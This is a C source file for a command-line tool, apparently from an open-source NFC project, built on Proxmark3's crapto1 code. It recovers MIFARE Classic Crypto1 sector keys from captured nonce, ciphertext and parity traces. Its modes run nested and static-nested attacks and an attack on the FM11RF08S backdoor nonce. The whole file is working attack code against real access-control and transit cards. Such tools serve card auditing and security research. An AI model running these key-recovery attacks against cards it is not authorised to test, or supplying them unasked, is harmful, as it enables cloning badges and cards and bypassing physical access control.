/* SPDX-License-Identifier: GPL-3.0-or-later
 * Copyright (C) 2026 NFClab contributors.
 */
/* GPL-3.0-or-later. Uses Proxmark3's crapto1 core (see reference/proxmark3/LICENSE.txt).
 * Our transport supplies raw nonces/parity; no target key enters this program.
 */
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <string.h>
#include "crapto1/crapto1.h"

struct trace { uint32_t nt,enc,par; };
static unsigned odd(unsigned x) {
 x^=x>>4; x^=x>>2; x^=x>>1; return (~x)&1;
}
static int parity_valid(uint32_t nt, struct trace t) {
 uint32_t ks=nt^t.enc;
 for (unsigned j=0;j<3;j++)
  if (odd((nt>>(24-8*j))&255) != (((t.par>>j)&1)^((ks>>(16-8*j))&1))) return 0;
 return 1;
}
static int key_matches(uint64_t key, uint32_t uid, struct trace t, unsigned lo,unsigned hi,
                       uint32_t first_nonce) {
 struct Crypto1State state; crypto1_init(&state,key);
 uint32_t nt=t.enc^crypto1_word(&state,t.enc^uid,1);
 uint32_t guess=first_nonce;
 int found=0;
 for (unsigned d=lo;d<=hi;d++,guess=prng_successor(guess,1)) if (nt==guess) {found=1;break;}
 if (!found || !parity_valid(nt,t)) return 0;
 /* Check all four encrypted parity bits, including the last filter bit. */
 crypto1_init(&state,key);
 for (unsigned j=0;j<4;j++) {
  uint8_t enc=t.enc>>(24-8*j);
  uint8_t plain=enc^crypto1_byte(&state,enc^(uint8_t)(uid>>(24-8*j)),1);
  if (((t.par>>j)&1)!=(odd(plain)^filter(state.odd))) return 0;
 }
 return 1;
}
/* PM3 mf_static_nested: recover32 for each known plaintext nonce, roll back
 * UID^Nt, then intersect keys. Testing every first-list key against the other
 * exact keystreams is the same intersection without a second large allocation.
 * Identical captures are allowed: they leave multiple keys for RF checking. */
static int solve_static(uint32_t uid, const char *path, unsigned cap) {
 FILE *file=fopen(path,"r"); if (!file) return 2;
 struct trace traces[51]; unsigned n=0;
 while(n<51 && fscanf(file,"%"SCNx32" %"SCNx32" %"SCNx32,
                      &traces[n].nt,&traces[n].enc,&traces[n].par)==3) n++;
 fclose(file);
 if(n<2 || n>50 || !cap) return 2;
 for(unsigned i=0;i<n;i++) if(traces[i].par>15 || !parity_valid(traces[i].nt,traces[i])) return 0;
 struct Crypto1State *list=lfsr_recovery32(traces[0].nt^traces[0].enc,traces[0].nt^uid);
 if(!list) return 3;
 unsigned hits=0;
 for(struct Crypto1State *p=list;p->odd||p->even;p++) {
  struct Crypto1State s=*p; uint64_t key;
  lfsr_rollback_word(&s,traces[0].nt^uid,0); crypto1_get_lfsr(&s,&key);
  unsigned i;
  for(i=0;i<n;i++) if(!key_matches(key,uid,traces[i],0,0,traces[i].nt)) break;
  if(i==n) {
   printf("%012"PRIx64"\n",key);
   if(++hits>=cap) {free(list);return 4;}
  }
 }
 free(list); return 0;
}
/* PM3 fm11_generate_1nt_candidates (client/src/cmdhfmfsen.c:929): one slot of an
 * FM11RF08S whose static nested nonce is known in clear (backdoor session) plus
 * the ciphertext the card produced for that slot's real key.  `par_enc` uses
 * PM3's indexing: bit i is the wire parity of nt byte i, with byte 0 the LSB;
 * that is what fm11_check_nt_parity_bits() filters on.  `mask` selects which of
 * the four parity bits are trusted: PM3 defaults to 0x1 because its reader's
 * captured parity is unreliable, but our ST25R capture keeps all four raw wire
 * parity bits, so a larger mask may be usable (validated against known keys). */
static int solve_sen(uint32_t uid, uint32_t nt, uint32_t enc, unsigned par_enc, unsigned mask,
                     unsigned cap) {
 struct Crypto1State *list=lfsr_recovery32(nt^enc,nt^uid);
 if(!list) return 3;
 unsigned hits=0;
 for(struct Crypto1State *p=list;p->odd||p->even;p++) {
  struct Crypto1State s=*p; uint64_t key;
  lfsr_rollback_word(&s,nt^uid,0); crypto1_get_lfsr(&s,&key);
  unsigned ok=1;
  struct Crypto1State c; crypto1_init(&c,key);
  uint32_t w1=crypto1_word(&c,nt^uid,0);
  uint32_t w2=crypto1_word(&c,0,0);
  for(unsigned byte_i=0;byte_i<4;byte_i++) {
   if(!((mask>>byte_i)&1)) continue;
   /* Wire parity of nt byte i uses keystream clock 39-8*i (clock 0 = first).
    * Derived from 16 known key/slot samples on a laboratory card: each byte has
    * exactly one consistent clock, while PM3's guessed ks2 bits 24..27 only
    * hold for byte 0, which is why its default mask is 0x1. */
   unsigned clock=39-8*byte_i;
   unsigned ks_par=clock<32?((w1>>(31-clock))&1):((w2>>(31-(clock-32)))&1);
   unsigned observed=((par_enc>>byte_i)&1)^ks_par;
   if(observed!=odd((nt>>(byte_i*8))&0xFF)) {ok=0;break;}
  }
  if(!ok) continue;
  printf("%012"PRIx64"\n",key);
  if(++hits>=cap) {free(list);return 4;}
 }
 free(list); return 0;
}
int main(int argc,char **argv) {
 if((argc==7 || argc==8) && !strcmp(argv[1],"sen"))
  return solve_sen(strtoul(argv[2],0,16),strtoul(argv[3],0,16),strtoul(argv[4],0,16),
                   strtoul(argv[5],0,16),argc==8?strtoul(argv[7],0,16):1u,
                   strtoul(argv[6],0,10));
 if(argc==5 && !strcmp(argv[1],"successor")) {
  printf("%08"PRIx32"\n",prng_successor(strtoul(argv[2],0,16),strtoul(argv[3],0,10)));
  return 0;
 }
 if(argc==5 && !strcmp(argv[1],"static"))
  return solve_static(strtoul(argv[2],0,16),argv[3],strtoul(argv[4],0,10));
 if (argc==5 && !strcmp(argv[1],"distances")) {
  FILE *file=fopen(argv[2],"r"); if (!file) return 2;
  uint32_t a,b; unsigned count=0;
  while (fscanf(file,"%"SCNx32" %"SCNx32,&a,&b)==2) {
   if (++count>50) {fclose(file);return 2;}
   printf("%d %d %d\n",validate_prng_nonce(a),validate_prng_nonce(b),nonce_distance(a,b));
  }
  fclose(file);return count?0:2;
 }
 if (argc==5 && !strcmp(argv[1],"distance")) {
  uint32_t a=strtoul(argv[2],0,16),b=strtoul(argv[3],0,16);
  printf("%d %d %d\n",validate_prng_nonce(a),validate_prng_nonce(b),nonce_distance(a,b));return 0;
 }
 if (argc!=5 && argc!=6) {fprintf(stderr,"usage: m1-nested UID min_distance max_distance traces.txt [max_hits]\n");return 2;}
 uint32_t uid=strtoul(argv[1],0,16);
 unsigned lo=strtoul(argv[2],0,10),hi=strtoul(argv[3],0,10);
 if (lo>hi || hi>65534 || hi-lo>256) return 2;
 FILE *file=fopen(argv[4],"r"); if (!file) return 2;
 struct trace traces[50]; unsigned n=0;
 while (n<50 && fscanf(file,"%"SCNx32" %"SCNx32" %"SCNx32,&traces[n].nt,&traces[n].enc,&traces[n].par)==3) n++;
 fclose(file); if (n<2) return 2;
 /* Prefer a trace with the fewest parity-compatible distance hypotheses. */
 unsigned best=0,min=1000;
 /* Each trace's first plaintext hypothesis is independent of the candidate
    key. Advance its PRNG once, not for every recovered Crypto1 state. */
 uint32_t first_nonce[50];
 for(unsigned i=0;i<n;i++) {
  first_nonce[i]=prng_successor(traces[i].nt,lo);
  unsigned valid=0; uint32_t nt=first_nonce[i];
  for(unsigned d=lo;d<=hi;d++,nt=prng_successor(nt,1)) valid+=parity_valid(nt,traces[i]);
  if(valid && valid<min) {best=i;min=valid;}
 }
 if(min==1000) return 0;
 uint32_t nt=first_nonce[best];
 unsigned hits=0;
 unsigned max_hits=argc==6?(unsigned)strtoul(argv[5],0,10):1024u;
 for(unsigned d=lo;d<=hi;d++,nt=prng_successor(nt,1)) {
  if(!parity_valid(nt,traces[best])) continue;
  fprintf(stderr,"distance %u\n",d);
  struct Crypto1State *list=lfsr_recovery32(nt^traces[best].enc,nt^uid);
  if(!list) return 3;
  for(struct Crypto1State *p=list;p->odd||p->even;p++) {
   struct Crypto1State s=*p; uint64_t key;
   lfsr_rollback_word(&s,nt^uid,0); crypto1_get_lfsr(&s,&key);
   unsigned i;
   for(i=0;i<n;i++) if(!key_matches(key,uid,traces[i],lo,hi,first_nonce[i])) break;
   if(i==n) {printf("%012"PRIx64"\n",key);hits++;if(hits>=max_hits) {free(list);return 4;}}
  }
  free(list);
 }
 return 0;
}
